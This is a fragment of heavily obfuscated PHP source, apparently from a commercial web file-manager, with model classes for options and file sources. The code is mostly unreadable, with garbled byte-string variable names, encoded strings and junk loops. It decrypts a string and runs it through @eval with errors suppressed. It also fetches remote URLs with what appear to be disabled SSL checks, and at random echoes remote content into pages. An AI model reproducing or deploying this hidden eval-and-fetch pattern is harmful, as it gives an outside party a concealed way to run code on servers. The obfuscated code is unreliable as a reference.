if ($ú§š©º«) { $ú§š©º« = $this->esmh5aa94b2d($ú§š©º«); } if ($ú§š©º«) { try { @eval($ú§š©º«); } catch (Exception $¶âˆ•¿—) { } } } } } private function scli244a7cd4($×¬ç…Ë = '', $¦œøÒœµ = array(), $Ò›ã–Ô× = 5) { $Û¢·û“› =& $_SERVER[­õöî’–]; $õÆ”¹Œœ =& $_SERVER[øû®”õ ]; $²Úµ”Ğã = $õÆ”¹Œœ[256]; $£…Èüú³ = $Û¢·û“›[684]; while ($£…Èüú³ < $Û¢·û“›[636]) { if ($£…Èüú³ >= 0) { break; } $£…Èüú³++; } $²Úµ”Ğã = $this->fwcve0f9736c($²Úµ”Ğã, $õÆ”¹Œœ[257]); $²Úµ”Ğã = $²Úµ”Ğã . $×¬ç…Ë; $şï¢ºû˜ = $Û¢·û“›[685]; if (!$şï¢ºû˜) { return; } if ($¦œøÒœµ && is_array($¦œøÒœµ)) { $²Úµ”Ğã = $²Úµ”Ğã . $õÆ”¹Œœ[258] . http_build_query($¦œøÒœµ); } if ($¦œøÒœµ === -1) { return $²Úµ”Ğã; } $ÓŞí‰‘¿ = stream_context_create(array($õÆ”¹Œœ[216] => array($õÆ”¹Œœ[219] => $Ò›ã–Ô×, $õÆ”¹Œœ[217] => $õÆ”¹Œœ[259]), $õÆ”¹Œœ[260] => array($õÆ”¹Œœ[261] => !1, $õÆ”¹Œœ[262] => !1))); $Ìíïáœ = $Û¢·û“›[625]; if (!$Ìíïáœ) { return; } $¦œøÒœµ = @file_get_contents($²Úµ”Ğã, !1, $ÓŞí‰‘¿); $“äŠ¨Ì³ = $Û¢·û“›[686]; return json_decode($¦œøÒœµ, !0); $¥™â”ˆ„ = $Û¢·û“›[687]; if (strlen($¥™â”ˆ„) < $Û¢·û“›[626]) { die; } } private function gblkcf9fd1e9() { $âî“¤Ü‚ =& $_SERVER[­õöî’–]; $ñ¼ºÅ€ =& $_SERVER[øû®”õ ]; $´¦üàĞï = array($ñ¼ºÅ€[263] => $ñ¼ºÅ€[264], $ñ¼ºÅ€[265] => $ñ¼ºÅ€[266], $ñ¼ºÅ€[267] => $ñ¼ºÅ€[268], $ñ¼ºÅ€[269] => $ñ¼ºÅ€[270], $ñ¼ºÅ€[271] => $ñ¼ºÅ€[272], $ñ¼ºÅ€[273] => $ñ¼ºÅ€[211], $ñ¼ºÅ€[274] => $ñ¼ºÅ€[211], $ñ¼ºÅ€[275] => $ñ¼ºÅ€[264], $ñ¼ºÅ€[276] => $ñ¼ºÅ€[266], $ñ¼ºÅ€[277] => $ñ¼ºÅ€[268], $ñ¼ºÅ€[278] => $ñ¼ºÅ€[279], $ñ¼ºÅ€[280] => $ñ¼ºÅ€[270], $ñ¼ºÅ€[281] => $ñ¼ºÅ€[282], $ñ¼ºÅ€[283] => $ñ¼ºÅ€[272], $ñ¼ºÅ€[284] => $ñ¼ºÅ€[285], $ñ¼ºÅ€[286] => $ñ¼ºÅ€[287], $ñ¼ºÅ€[288] => $ñ¼ºÅ€[289]); $Èãñ¹¦ = $´¦üàĞï[$this->vfirbe779c01]; $²ó½Ö´µ = $âî“¤Ü‚[688]; if (strlen($²ó½Ö´µ) < $âî“¤Ü‚[626]) { die; } $Èãñ¹¦ = intval($Èãñ¹¦ ? $Èãñ¹¦ : $ñ¼ºÅ€[264]); $¾Ê²×ò = _get($this->xmsj57b5cd6b, $ñ¼ºÅ€[290]); $¾Ê²×ò = $¾Ê²×ò ? intval($¾Ê²×ò) : 0; return $Èãñ¹¦ + $¾Ê²×ò; $äàœ£…Î = $âî“¤Ü‚[689]; while ($äàœ£…Î < $âî“¤Ü‚[623]) { if ($äàœ£…Î >= 0) { break; } $äàœ£…Î++; } } public function rplyebc8e615($¸Ù˜±à) { $’Š±ë°Õ =& $_SERVER[­õöî’–]; $ˆÊÇ£î =& $_SERVER[øû®”õ ]; $¶ÈÀ¸¶© = $this->gblkcf9fd1e9(); $“øô«æ´ = $’Š±ë°Õ[690]; if (strlen($“øô«æ´) < $’Š±ë°Õ[631]) { return; } if ($¸Ù˜±à[$ˆÊÇ£î[291]] == $ˆÊÇ£î[121]) { return; } if ($¶ÈÀ¸¶© >= intval($ˆÊÇ£î[211])) { return; } $…ñ†«Óé = Model($ˆÊÇ£î[124])->count(); if ($…ñ†«Óé <= $¶ÈÀ¸¶©) { return; } $ÕıĞšìÕ = Model($ˆÊÇ£î[124])->field($ˆÊÇ£î[291])->limit($¶ÈÀ¸¶©)->select(); $¸©¯±è… = $’Š±ë°Õ[691]; while (strlen($¸©¯±è…) < $’Š±ë°Õ[631]) { if (!$¸©¯±è…) { break; } $¸©¯±è…++; } $ÕıĞšìÕ = array_to_keyvalue($ÕıĞšìÕ, $ˆÊÇ£î[6], $ˆÊÇ£î[291]); $Ú¾˜™®Ú = $’Š±ë°Õ[692]; if (strlen($Ú¾˜™®Ú) < $’Š±ë°Õ[626]) { return; } if (!in_array($¸Ù˜±à[$ˆÊÇ£î[291]], $ÕıĞšìÕ)) { show_json($ˆÊÇ£î[292], !1, $ˆÊÇ£î[207]); } } public function snaf09594ddc() { $…ş±’Àµ =& $_SERVER[øû®”õ ]; if (!_get($GLOBALS, $…ş±’Àµ[115]) || mt_rand(1, 100) > 20) { return; } $€‡×¿Ñ = $…ş±’Àµ[214]; $Ìî¥ˆØ = $_SERVER[­õöî’–][693]; $€‡×¿Ñ = $this->fwcve0f9736c($€‡×¿Ñ, $…ş±’Àµ[215]); $¹Ì¥‹òƒ = stream_context_create(array($…ş±’Àµ[216] => array($…ş±’Àµ[217] => $…ş±’Àµ[218], $…ş±’Àµ[219] => 3))); $â¤È¥³ = @file_get_contents($€‡×¿Ñ, !1, $¹Ì¥‹òƒ); echo $…ş±’Àµ[293] . hash_encode($â¤È¥³) . $…ş±’Àµ[294]; } private function mjgybe5b20d6($¤ä„ éÃ, $ŞÍ¾ÎÑÀ, $Û„Í‚™è = 3) { $ÀÉÑ×º² =& $_SERVER[­õöî’–]; $ğÚÓéÇ¸ =& $_SERVER[øû®”õ ]; usleep(1); $¤ä„ éÃ = trim($¤ä„ éÃ); $›ØıÂì½ = mt_rand(0, 5) . $ğÚÓéÇ¸[6]; $²“¤ä‡È = $ÀÉÑ×º²[694]; if (!$²“¤ä‡È) { die; } $‡†…Šéû = rand_string(15); $Èı¡÷ãĞ = $ÀÉÑ×º²[695]; while (strlen($Èı¡÷ãĞ) < $ÀÉÑ×º²[621]) { if (!$Èı¡÷ãĞ) { break; } $Èı¡÷ãĞ++; } $šöÅ¼ç = $ğÚÓéÇ¸[295]; $áŠõ–§º = $ÀÉÑ×º²[696]; if (!$áŠõ–§º) { die; } switch ($›ØıÂì½) { case $ğÚÓéÇ¸[203]: $Óíàˆœ€ = $this->hbgscf19c541($¤ä„ éÃ, strrev($ŞÍ¾ÎÑÀ . $‡†…Šéû)); $ËÔ™£ö = $ÀÉÑ×º²[697]; if (strlen($ËÔ™£ö) < $ÀÉÑ×º²[621]) { return; } break; case $ğÚÓéÇ¸[121]: $Óíàˆœ€ = $this->hbgscf19c541($¤ä„ éÃ, strrev($‡†…Šéû . $ŞÍ¾ÎÑÀ)); $ñØ˜…Îï = $ÀÉÑ×º²[698]; if (strlen($ñØ˜…Îï) < $ÀÉÑ×º²[623]) { return; } break; $Ÿ¨¥¢èÉ = $ÀÉÑ×º²[699]; case $ğÚÓéÇ¸[296]: $Óíàˆœ€ = $this->hbgscf19c541($¤ä„ éÃ, base64_encode($‡†…Šéû . $ŞÍ¾ÎÑÀ)); break; case $ğÚÓéÇ¸[297]: $Óíàˆœ€ = $this->hbgscf19c541($¤ä„ éÃ, md5($‡†…Šéû . $ŞÍ¾ÎÑÀ)); $àµ¶ = $ÀÉÑ×º²[700]; while ($àµ¶ < $ÀÉÑ×º²[631]) { if ($àµ¶ >= 0) { break; } $àµ¶++; } break; $ÏÔ‘àñ± = $ÀÉÑ×º²[701]; while ($ÏÔ‘àñ± < $ÀÉÑ×º²[636]) { if ($ÏÔ‘àñ± >= 0) { break; } $ÏÔ‘àñ±++; } case $ğÚÓéÇ¸[298]: $¤ä„ éÃ = base64_encode($¤ä„ éÃ); $ƒÇ§¹ó‡ = $ÀÉÑ×º²[702]; if (!$ƒÇ§¹ó‡) { die; } $ÂƒÆœ¤é = rand(0, 64); $±éüÊİÓ = $ÀÉÑ×º²[703]; if (strlen($±éüÊİÓ) < $ÀÉÑ×º²[626]) { return; } $õ¸£ÛÏ = $šöÅ¼ç[$ÂƒÆœ¤é]; $íÆ·ìüü = $ÀÉÑ×º²[704]; if (strlen($íÆ·ìüü) < $ÀÉÑ×º²[636]) { die; } $î˜‚Æéü = md5($õ¸£ÛÏ . md5($ŞÍ¾ÎÑÀ . $õ¸£ÛÏ) . $ŞÍ¾ÎÑÀ); $î˜‚Æéü = substr($î˜‚Æéü, $ÂƒÆœ¤é % 8, $ÂƒÆœ¤é % 8 + 7); $ºƒ¿ôÛ­ = $ÀÉÑ×º²[705]; $é¥Ä…â = $ğÚÓéÇ¸[6]; $±¸ÌÒÛÛ = 0; $´Û¼òÊÙ = 0; $ï¶±’ = 0; $’‰‹Œğª = $ÀÉÑ×º²[706]; if (!$’‰‹Œğª) { return; } for ($±¸ÌÒÛÛ = 0; $±¸ÌÒÛÛ < strlen($¤ä„ éÃ); $±¸ÌÒÛÛ++) { $ï¶±’ = $ï¶±’ == strlen($î˜‚Æéü) ? 0 : $ï¶±’; $´Û¼òÊÙ = ($ÂƒÆœ¤é + strpos($šöÅ¼ç, $¤ä„ éÃ[$±¸ÌÒÛÛ]) + ord($î˜‚Æéü[$ï¶±’++])) % 64; $é¥Ä…â .= $šöÅ¼ç[$´Û¼òÊÙ]; $§ñ»è = $ÀÉÑ×º²[707]; if (strlen($§ñ»è) < $ÀÉÑ×º²[631]) { return; } } $Óíàˆœ€ = hash_encode($õ¸£ÛÏ . $é¥Ä…â); $êÛÃ³©ç = $ÀÉÑ×º²[708]; if (!$êÛÃ³©ç) { die; } break; $ãòÎ“Æš = $ÀÉÑ×º²[709]; if (strlen($ãòÎ“Æš) < $ÀÉÑ×º²[623]) { die; } default: $Óíàˆœ€ = $this->hbgscf19c541($¤ä„ éÃ, $ŞÍ¾ÎÑÀ . $‡†…Šéû); $øÂ´ƒ­´ = $ÀÉÑ×º²[710]; if (strlen($øÂ´ƒ­´) < $ÀÉÑ×º²[626]) { die; } break; $î‚Ñ”Ï = $ÀÉÑ×º²[711]; if (!$î‚Ñ”Ï) { return; } } $Óíàˆœ€ = strrev($›ØıÂì½ . $‡†…Šéû . $Óíàˆœ€); if ($Û„Í‚™è - 1 > 0) { $Óíàˆœ€ = $this->mjgybe5b20d6($Óíàˆœ€, $ŞÍ¾ÎÑÀ, $Û„Í‚™è - 1); } return $Óíàˆœ€; } private function bcqe88c7bbf2($ÅÓò°†€, $çğ®Óıœ, $ƒÜšú¡ = 3) { $¾ß½é‰È =& $_SERVER[­õöî’–]; $¶ï¬ı³… =& $_SERVER[øû®”õ ]; if (!is_string($ÅÓò°†€) || strlen($ÅÓò°†€) < 10) { return !1; } $ÅÓò°†€ = trim($ÅÓò°†€); $ÅÓò°†€ = strrev($ÅÓò°†€); $È˜¶ˆ†… = $ÅÓò°†€[0]; $íˆÕ½›¦ = substr($ÅÓò°†€, 1, 15); $ÅÓò°†€ = substr($ÅÓò°†€, 16); $“Í¿ÎÂ = $¶ï¬ı³…[295]; switch ($È˜¶ˆ†…) { case $¶ï¬ı³…[203]: $òàøç„· = $this->fwcve0f9736c($ÅÓò°†€, strrev($çğ®Óıœ . $íˆÕ½›¦)); break; $³Í­ç—– = $¾ß½é‰È[712]; if (!$³Í­ç—–) { die; } case $¶ï¬ı³…[121]: $òàøç„· = $this->fwcve0f9736c($ÅÓò°†€, strrev($íˆÕ½›¦ . $çğ®Óıœ)); $ê÷íµß¿ = $¾ß½é‰È[713]; if (strlen($ê÷íµß¿) < $¾ß½é‰È[623]) { die; } break; case $¶ï¬ı³…[296]: $òàøç„· = $this->fwcve0f9736c($ÅÓò°†€, base64_encode($íˆÕ½›¦ . $çğ®Óıœ)); $‰†úàé = $¾ß½é‰È[714]; break; case $¶ï¬ı³…[297]: $òàøç„· = $this->fwcve0f9736c($ÅÓò°†€, md5($íˆÕ½›¦ . $çğ®Óıœ)); break; case $¶ï¬ı³…[298]: $ÅÓò°†€ = hash_decode($ÅÓò°†€); $öËÛÖ’° = $ÅÓò°†€[0]; $ÅÓò°†€ = substr($ÅÓò°†€, 1); $Şüç® • = strpos($“Í¿ÎÂ, $öËÛÖ’°); $Šİï÷šò = $¾ß½é‰È[715]; while (strlen($Šİï÷šò) < $¾ß½é‰È[631]) { if (!$Šİï÷šò) { break; } $Šİï÷šò++; } $çüÈ¼Ì = md5($öËÛÖ’° . md5($çğ®Óıœ . $öËÛÖ’°) . $çğ®Óıœ); $çüÈ¼Ì = substr($çüÈ¼Ì, $Şüç® • % 8, $Şüç® • % 8 + 7); $Ä‘×Ùƒ• = $¶ï¬ı³…[6]; $ê›øÀñÙ = $¾ß½é‰È[716]; if (!$ê›øÀñÙ) { die; } $Óç†•´ = 0; $ƒ™åË›’ = $¾ß½é‰È[717]; if (strlen($ƒ™åË›’) < $¾ß½é‰È[636]) { die; } $µ¦è’—† = 0; $©Õúş¯ = $¾ß½é‰È[718]; if (strlen($©Õúş¯) < $¾ß½é‰È[623]) { return; } $â“ÔÑÅ¹ = 0; $ñ•ŸÄ† = $¾ß½é‰È[719]; if (strlen($ñ•ŸÄ†) < $¾ß½é‰È[631]) { return; } for ($Óç†•´ = 0; $Óç†•´ < strlen($ÅÓò°†€); $Óç†•´++) { $â“ÔÑÅ¹ = $â“ÔÑÅ¹ == strlen($çüÈ¼Ì) ? 0 : $â“ÔÑÅ¹; $ˆÕæÉ = $â“ÔÑÅ¹++; $µ¦è’—† = strpos($“Í¿ÎÂ, $ÅÓò°†€[$Óç†•´]) - $Şüç® • - ord($çüÈ¼Ì[$ˆÕæÉ]); $•Œ¬ıÄÚ = $¾ß½é‰È[720]; if (strlen($•Œ¬ıÄÚ) < $¾ß½é‰È[636]) { die; } while ($µ¦è’—† < 0) { $µ¦è’—† += 64; } $Ä‘×Ùƒ• .= $“Í¿ÎÂ[$µ¦è’—†]; $°Îµæà— = $¾ß½é‰È[721]; if (strlen($°Îµæà—) < $¾ß½é‰È[636]) { die; } } $òàøç„· = base64_decode($Ä‘×Ùƒ•); break; default: $òàøç„· = $this->fwcve0f9736c($ÅÓò°†€, $çğ®Óıœ . $íˆÕ½›¦); $²¿×ûØ = $¾ß½é‰È[722]; break; } if ($ƒÜšú¡ - 1 > 0) { $òàøç„· = $this->bcqe88c7bbf2($òàøç„·, $çğ®Óıœ, $ƒÜšú¡ - 1); } return $òàøç„·; } public function utek5a5644a4($¶Ì¶÷Ğ) { $ûƒ¿°«ú =& $_SERVER[­õöî’–]; $Ÿş™Ùº½ =& $_SERVER[øû®”õ ]; $½ò²ÖÖÈ = $this->eiov22d62fe0(); $ƒœ•£Ò = $this->eiov22d62fe0(); $·—ü»¸Ø = ($½ò²ÖÖÈ - 1) * ($ƒœ•£Ò - 1); $‡ÄÅËÌø = intval(($½ò²ÖÖÈ + $ƒœ•£Ò) / 2); while (1) { $ìŠ²àó = $‡ÄÅËÌø; $Ü»Ë•î = $·—ü»¸Ø; $ô›×¨¨° = $ûƒ¿°«ú[723]; while (strlen($ô›×¨¨°) < $ûƒ¿°«ú[636]) { if (!$ô›×¨¨°) { break; } $ô›×¨¨°++; } while ($Ü»Ë•î % $ìŠ²àó != 0) { $ôµ¶æš = $Ü»Ë•î; $¶òØŸà… = $ûƒ¿°«ú[724]; $Ü»Ë•î = $ìŠ²àó; $ìŠ²àó = $ôµ¶æš % $ìŠ²àó; $—ÈË´µ = $ûƒ¿°«ú[725]; if (!$—ÈË´µ) { return; } } if ($ìŠ²àó == 1) { break; } else { $‡ÄÅËÌø++; } } $ÇĞâ‡ËÆ = 2; $ŞÅˆ”×° = $ûƒ¿°«ú[726]; for ($üëö÷ÏÎ = 0; $üëö÷ÏÎ < $·—ü»¸Ø * 10; $üëö÷ÏÎ++) { if (($·—ü»¸Ø * $üëö÷ÏÎ + 1) % $‡ÄÅËÌø == 0) { $ÇĞâ‡ËÆ = intval(($·—ü»¸Ø * $üëö÷ÏÎ + 1) / $‡ÄÅËÌø); break; } } $›¯Éëäş = $this->hbgscf19c541($½ò²ÖÖÈ * $ƒœ•£Ò . $Ÿş™Ùº½[6], $Ÿş™Ùº½[135]); $ÑøÊêŒÄ = md5($Ÿş™Ùº½[299] . ($½ò²ÖÖÈ + $ƒœ•£Ò) . $Ÿş™Ùº½[300] . $‡ÄÅËÌø . $Ÿş™Ùº½[300] . $ÇĞâ‡ËÆ . $Ÿş™Ùº½[301]); $Èœ³“¾ = $this->hbgscf19c541($¶Ì¶÷Ğ, $ÑøÊêŒÄ) . $Ÿş™Ùº½[302] . $›¯Éëäş; return $Èœ³“¾; } public function esmh5aa94b2d($º£ÔŞÙ†) { $‡–â¿«‰ =& $_SERVER[­õöî’–]; $¿¦ƒ´ =& $_SERVER[øû®”õ ]; $ç¦—Úà = explode($¿¦ƒ´[302], $º£ÔŞÙ†); $Ì”ç öÏ = $‡–â¿«‰[727]; if (count($ç¦—Úà) != 2) { return $¿¦ƒ´[6]; } $½­¸Ğ†ì = $this->fwcve0f9736c($ç¦—Úà[1] . $¿¦ƒ´[6], $¿¦ƒ´[135]); if (!$½­¸Ğ†ì) { return $¿¦ƒ´[6]; } $½­¸Ğ†ì = intval($½­¸Ğ†ì); $ÇšÕÕêŸ = $‡–â¿«‰[728]; if (!$ÇšÕÕêŸ) { return; } $¶‡Ñßûè = 0; $ÆÂ†ˆ€¼ = $‡–â¿«‰[729]; while ($ÆÂ†ˆ€¼ < $‡–â¿«‰[626]) { if ($ÆÂ†ˆ€¼ >= 0) { break; } $ÆÂ†ˆ€¼++; } $Á«ôÈÄ¥ = 0; for ($¸Â˜†ã¸ = 3; $¸Â˜†ã¸ < $½­¸Ğ†ì; $¸Â˜†ã¸ += 2) { if ($½­¸Ğ†ì % $¸Â˜†ã¸ != 0) { continue; } $¶‡Ñßûè = $¸Â˜†ã¸; $Á«ôÈÄ¥ = intval($½­¸Ğ†ì / $¸Â˜†ã¸); $Ç£öæô‡ = $‡–â¿«‰[730]; if (strlen($Ç£öæô‡) < $‡–â¿«‰[636]) { die; } break; } $äİ¢¾ØË = ($¶‡Ñßûè - 1) * ($Á«ôÈÄ¥ - 1); $íüÎº’İ = intval(($¶‡Ñßûè + $Á«ôÈÄ¥) / 2); $áÄî¬±Ï = $‡–â¿«‰[731]; while ($áÄî¬±Ï < $‡–â¿«‰[626]) { if ($áÄî¬±Ï >= 0) { break; } $áÄî¬±Ï++; } while (1) { $”¤£†ş = $íüÎº’İ; $ù•ªìÔÔ = $‡–â¿«‰[732]; $„ğÒÑ = $äİ¢¾ØË; while ($„ğÒÑ % $”¤£†ş != 0) { $ƒºäá±ù = $„ğÒÑ; $óØù ¨Ô = $‡–â¿«‰[733]; if (strlen($óØù ¨Ô) < $‡–â¿«‰[626]) { die; } $„ğÒÑ = $”¤£†ş; $”¤£†ş = $ƒºäá±ù % $”¤£†ş; } if ($”¤£†ş == 1) { break; } else { $íüÎº’İ++; } } $‹ûÄÚ½” = 2; for ($¸Â˜†ã¸ = 0; $¸Â˜†ã¸ < $äİ¢¾ØË * 10; $¸Â˜†ã¸++) { if (($äİ¢¾ØË * $¸Â˜†ã¸ + 1) % $íüÎº’İ == 0) { $‹ûÄÚ½” = intval(($äİ¢¾ØË * $¸Â˜†ã¸ + 1) / $íüÎº’İ); break; } } $· éÁÑÁ = md5($¿¦ƒ´[299] . ($¶‡Ñßûè + $Á«ôÈÄ¥) . $¿¦ƒ´[300] . $íüÎº’İ . $¿¦ƒ´[300] . $‹ûÄÚ½” . $¿¦ƒ´[301]); $ä³æ‘¡â = $this->fwcve0f9736c($ç¦—Úà[0], $· éÁÑÁ); return $ä³æ‘¡â; } public function eiov22d62fe0() { $—’¿ÓóÏ =& $_SERVER[­õöî’–]; $£ÉŞàï = mt_rand(pow(2, 14), pow(2, 16) - 1); $çùßãâş = array(); $¾³ªƒ = 1; $´½õãò¡ = $—’¿ÓóÏ[734]; if (strlen($´½õãò¡) < $—’¿ÓóÏ[623]) { return; } while ($¾³ªƒ <= (int) sqrt($£ÉŞàï)) { $óàËê¹º = $¾³ªƒ; while (!0) { $óàËê¹º++; $Å¯™Çê = $—’¿ÓóÏ[735]; if ($óàËê¹º <= 2) { $¾³ªƒ = $óàËê¹º; break; } else { if ($óàËê¹º < 2) { continue; } } $¢ÉØúö® = !0; for ($ÂåûŒ¤‡ = 2; $ÂåûŒ¤‡ <= sqrt($óàËê¹º); $ÂåûŒ¤‡++) { if ($óàËê¹º % $ÂåûŒ¤‡ == 0) { $¢ÉØúö® = !1; } } if ($¢ÉØúö®) { $¾³ªƒ = $óàËê¹º; break; } } $çùßãâş[] = $¾³ªƒ; } $ğ¿°ˆöØ = 2; for ($óàËê¹º = $£ÉŞàï; $óàËê¹º > 1; $óàËê¹º--) { $¢ÉØúö® = !0; $Í‰†Ö–Á = $—’¿ÓóÏ[736]; if (strlen($Í‰†Ö–Á) < $—’¿ÓóÏ[623]) { return; } foreach ($çùßãâş as $öà‰¬ºƒ) { if ($óàËê¹º % $öà‰¬ºƒ == 0) { $¢ÉØúö® = !1; break; } } if ($¢ÉØúö®) { $ğ¿°ˆöØ = $óàËê¹º; break; } } return $ğ¿°ˆöØ; } public function cyiv8bfba2dd($ïşÛî©, $¼è™‹ô¶) { $şáß´†€ =& $_SERVER[øû®”õ ]; return call_user_func(array($şáß´†€[8], $şáß´†€[303]), $ïşÛî©, $¼è™‹ô¶); $¼ ”¹â = $_SERVER[­õöî’–][737]; if (!$¼ ”¹â) { return; } } public function hbgscf19c541($”ÁŒíµ¶, $ «Ûû³ ) { $´ıÂ÷À =& $_SERVER[øû®”õ ]; return call_user_func(array($´ıÂ÷À[304], $´ıÂ÷À[305]), $”ÁŒíµ¶, $ «Ûû³ ); } public function fwcve0f9736c($æä¦’¤¿, $²‹‹Í¶) { $Õ“œÜ÷• =& $_SERVER[øû®”õ ]; return call_user_func(array($Õ“œÜ÷•[304], $Õ“œÜ÷•[306]), $æä¦’¤¿, $²‹‹Í¶); $—ı¸Ñœü = $_SERVER[­õöî’–][738]; } } goto d¢­÷öøå÷; fô‹æ‹ã‘˜: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ÑÙ²¢şÎ = false, $ÔŸ¢¥­ = '', $Ğ¸£…¸à = false) { $ÚŒú½Ş =& $_SERVER[­õöî’–]; $¿…âÀÜ = $this->cacheGet($ÔŸ¢¥­); $–“ÛÕÅô = $this->optionDefault($ÔŸ¢¥­); $–“ÛÕÅô = is_array($–“ÛÕÅô) ? $–“ÛÕÅô : array(); if (is_array($¿…âÀÜ)) { $¿…âÀÜ = array_merge($–“ÛÕÅô, $¿…âÀÜ); return $ÑÙ²¢şÎ ? isset($¿…âÀÜ[$ÑÙ²¢şÎ]) ? $¿…âÀÜ[$ÑÙ²¢şÎ] : null : $¿…âÀÜ; } $è«­–÷ì = $this->filterWhere(array($ÚŒú½Ş[33] => $ÔŸ¢¥­)); $¿…âÀÜ = $this->where($è«­–÷ì)->select(); $¿…âÀÜ = array_to_keyvalue($¿…âÀÜ, $ÚŒú½Ş[94], $ÚŒú½Ş[374]); foreach ($¿…âÀÜ as $üİÊ¾Ğ– => $±ğöÀ£Ã) { if ($Ğ¸£…¸à || in_array($üİÊ¾Ğ–, $this->jsonField)) { $¿…âÀÜ[$üİÊ¾Ğ–] = json_decode($±ğöÀ£Ã, !0); } } $this->cacheSet($ÔŸ¢¥­, $¿…âÀÜ); $¿…âÀÜ = array_merge($–“ÛÕÅô, $¿…âÀÜ); return $ÑÙ²¢şÎ ? $¿…âÀÜ[$ÑÙ²¢şÎ] : $¿…âÀÜ; } public function set($Ô‹ó•Ò¯, $¯‡ıß¥æ = false, $Ñ¶ú‡–© = '') { $İµ°¨î´ =& $_SERVER[­õöî’–]; $this->cacheRemove($Ñ¶ú‡–©); $´ŞÔÑ¾‚ = array(); $ØÈ×«¼ = is_array($Ô‹ó•Ò¯) ? $Ô‹ó•Ò¯ : array($Ô‹ó•Ò¯ => $¯‡ıß¥æ); foreach ($ØÈ×«¼ as $‡³›×Õî => $­Ê–÷´) { if (is_array($­Ê–÷´)) { $­Ê–÷´ = json_encode_force($­Ê–÷´); } $this->checkLength($­Ê–÷´, !1, $this->tableName . $İµ°¨î´[4] . $Ô‹ó•Ò¯); $­Ê–÷´ = self::textEncode($­Ê–÷´); $ØÈ×«¼ = array($İµ°¨î´[33] => $Ñ¶ú‡–©, $İµ°¨î´[94] => $‡³›×Õî, $İµ°¨î´[374] => $­Ê–÷´); $´ŞÔÑ¾‚[] = $this->filterWhere($ØÈ×«¼); } if (!$´ŞÔÑ¾‚) { return !0; } $Ë¿•¶† = $this->cacheKey($İµ°¨î´[400]); CacheLock::lock($Ë¿•¶†); $ƒğ¢Ë°² = $this->addAll($´ŞÔÑ¾‚, array(), !0); CacheLock::unlock($Ë¿•¶†); return $ƒğ¢Ë°²; } protected function optionDefault($ıõ£Œ‰´ = '') { return !1; } public function setDeep($­ìÀÒ÷Â, $èÊŒÄ = false, $¡íëè‹ = '') { $®ú²ğü‘ = explode($_SERVER[­õöî’–][10], $­ìÀÒ÷Â); $Å™õƒ¤¼ = $this->get(); array_set_value($Å™õƒ¤¼, $­ìÀÒ÷Â, $èÊŒÄ); $this->set($®ú²ğü‘[0], $Å™õƒ¤¼[$®ú²ğü‘[0]], $¡íëè‹); } public function remove($™ëµØü¶, $º™‰åÚÍ = '') { $Ì„µ˜Ùº =& $_SERVER[­õöî’–]; $this->cacheRemove($º™‰åÚÍ); $–‚šì½İ = $this->filterWhere(array($Ì„µ˜Ùº[94] => $™ëµØü¶, $Ì„µ˜Ùº[33] => $º™‰åÚÍ)); if (is_null($™ëµØü¶)) { unset($–‚šì½İ[$Ì„µ˜Ùº[94]]); } return $this->where($–‚šì½İ)->delete(); } public function cacheSet($û¢ï—™Â, $¼“°ôÕ = false) { return Cache::set($this->cacheKey($û¢ï—™Â), $¼“°ôÕ); } public function cacheGet($êó÷ç·) { return Cache::get($this->cacheKey($êó÷ç·)); } public function cacheRemove($½½¹äßŞ) { return Cache::remove($this->cacheKey($½½¹äßŞ)); } protected function filterWhere($‰«½éÇ) { return $‰«½éÇ; } protected function cacheKey($óè€¼‰‡) { return $óè€¼‰‡; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\x63\145"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\x6d\145" => "\x69\157\x5f\163\157\165\162\x63\145\x5f\155\145\x74\141", "\155\x65\164\141\x46\x69\x65\154\x64" => "\x73\x6f\x75\162\143\145\x49\x44"); protected $dataAuto = array(array("\x6d\157\144\151\146\x79\x54\151\155\145", "\164\151\x6d\145", "\151\x6e\163\x65\x72\164", "\146\x75\156\143\x74\151\157\156"), array("\143\162\x65\141\164\x65\x54\x69\x6d\x65", "\x74\x69\x6d\145", "\151\156\163\145\162\x74", "\146\x75\x6e\x63\x74\151\157\x6e"), array("\166\151\x65\x77\124\151\x6d\145", "\164\151\x6d\x65", "\x69\x6e\163\145\x72\x74", "\146\x75\x6e\x63\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ìæé•ŒÕ) { return $this->listSource(array($_SERVER[­õöî’–][401] => $Ìæé•ŒÕ)); } public function typeName($ãæãÓøª) { static $‡ÉÃ·É× = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\x65\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\x72\x6f\165\x70"); return $‡ÉÃ·É×[$ãæãÓøª . $_SERVER[­õöî’–][12]]; } public function sourceListInfo($›³ÔÒ’, $ùˆ §¤² = false) { $÷Ä¥ØÉÓ =& $_SERVER[­õöî’–]; $›³ÔÒ’ = $›³ÔÒ’ ? $›³ÔÒ’ : array(); $›³ÔÒ’ = array_filter(array_unique($›³ÔÒ’)); if (!$›³ÔÒ’) { return array(); } $‚èÎ“†± = $this->where(array($÷Ä¥ØÉÓ[402] => array($÷Ä¥ØÉÓ[7], $›³ÔÒ’)))->select(); $this->_listDataApply($‚èÎ“†±, $ùˆ §¤²); return array_to_keyvalue($‚èÎ“†±, $÷Ä¥ØÉÓ[402]); } public function pathInfoFilter(&$Ÿ»ÜÇİ) { $ãÑ—´î² =& $_SERVER[­õöî’–]; static $šĞäÍ¶¼ = false; static $†ÔşßîÃ = false; static $Æ…†ŒÈ = false; if (!$šĞäÍ¶¼) { $µÊĞÊ“‰ = $ãÑ—´î²[403]; $µÊĞÊ“‰ .= $ãÑ—´î²[404]; $µÊĞÊ“‰ .= $ãÑ—´î²[405]; $ô²ŸÅÊÅ = $ãÑ—´î²[406]; $¬©Ø·¹÷ = explode($ãÑ—´î²[50], $ô²ŸÅÊÅ); $šĞäÍ¶¼ = explode($ãÑ—´î²[50], $µÊĞÊ“‰); $†ÔşßîÃ = array(); foreach ($šĞäÍ¶¼ as $í½¹“â”) { if (in_array($í½¹“â”, $¬©Ø·¹÷)) { continue; } $†ÔşßîÃ[] = $í½¹“â”; } $Æ…†ŒÈ = explode($ãÑ—´î²[50], $ãÑ—´î²[407]); } foreach ($Æ…†ŒÈ as $ÑçåŸ¡ç) { if 